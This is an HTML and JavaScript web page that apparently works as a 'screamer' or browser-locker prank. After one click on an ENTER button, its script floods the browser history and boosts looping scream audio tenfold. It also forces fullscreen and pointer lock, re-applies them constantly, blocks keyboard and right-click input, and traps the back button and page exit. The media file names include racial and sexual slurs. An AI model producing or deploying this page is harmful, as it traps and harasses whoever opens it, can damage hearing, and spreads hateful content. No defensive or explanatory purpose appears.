<!DOCTYPE html>
<html>
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-149452514-1');
    </script>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3026390331916120"
         crossorigin="anonymous"></script>

<style>
* {
    padding: 0;
    margin: 0;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}
body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}
.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 1000;
}
.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
    flex-shrink: 0;
}
.video-wrapper video,
.video-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}
.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    flex-shrink: 0;
}
.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}
.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}
.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}
.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    overflow: hidden;
}
#naggarsCanvas {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <div class="video-wrapper">
        <img id="wads" src="wads.gif" alt="">
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<!-- FAST NAGGARS.GIF -->
<div class="backg">
    <canvas id="naggarsCanvas"></canvas>
</div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    let audioContext;
    let gainNode;
    const mediaElements = [];

    // === FAST BACKGROUND GIF (2.5x speed) ===
    function startFastNaggars() {
        const canvas = document.getElementById('naggarsCanvas');
        const ctx = canvas.getContext('2d');
        const img = new Image();
        img.src = "naggars.gif";

        let lastTime = 0;
        const speedMultiplier = 2.5;

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        img.onload = function() {
            function draw(timestamp) {
                if (!lastTime) lastTime = timestamp;
                const elapsed = timestamp - lastTime;

                // Draw at 2.5x speed
                if (elapsed > (16.67 / speedMultiplier)) {  // ~60fps base
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    lastTime = timestamp;
                }
                requestAnimationFrame(draw);
            }
            requestAnimationFrame(draw);
        };
    }

    // --- AUDIO BOOST ---
    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10;
        gainNode.connect(audioContext.destination);

        const audioIds = ['shart', 'shart2', 'shart3'];
        audioIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });

        const videoIds = ['fart', 'ronnie'];
        videoIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume();
        }
        mediaElements.forEach(m => {
            if (m) {
                m.volume = 1.0;
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        setInterval(() => m.play(), 100);
                    });
                }
            }
        });
    }

    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    function lockPointer() {
        if (document.body.requestPointerLock) {
            document.body.requestPointerLock();
        }
    }

    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }

    function blockKeys(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    function reengageLocks() {
        if (hasTriggered) {
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                attemptFullscreen();
            }
            if (!document.pointerLockElement) {
                lockPointer();
            }
        }
    }

    // --- START FUNCTION ---
    window.startExperience = function() {
        if (hasTriggered) return;
        hasTriggered = true;

        const overlay = document.getElementById('startOverlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        floodHistory();
        initAudioBoost();
        playAllMedia();
        attemptFullscreen();
        lockPointer();
        startFastNaggars();           // ← 2.5x faster naggars.gif

        setInterval(reengageLocks, 200);

        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
        events.forEach(eventType => {
            document.addEventListener(eventType, reengageLocks, true);
        });

        document.addEventListener('fullscreenchange', reengageLocks);
        document.addEventListener('webkitfullscreenchange', reengageLocks);
        document.addEventListener('mozfullscreenchange', reengageLocks);
        document.addEventListener('MSFullscreenChange', reengageLocks);
        document.addEventListener('pointerlockchange', reengageLocks);
        document.addEventListener('mozpointerlockchange', reengageLocks);
        document.addEventListener('webkitpointerlockchange', reengageLocks);
        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);
    document.addEventListener('contextmenu', e => e.preventDefault(), true);
    document.addEventListener('dragstart', e => e.preventDefault(), true);
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    window.onbeforeunload = function() {
        return "Are you absolutely sure you want to leave?";
    };

    window.onpopstate = function() {
        if (hasTriggered) {
            floodHistory();
            reengageLocks();
        }
    };
})();
</script>
</body>
</html>
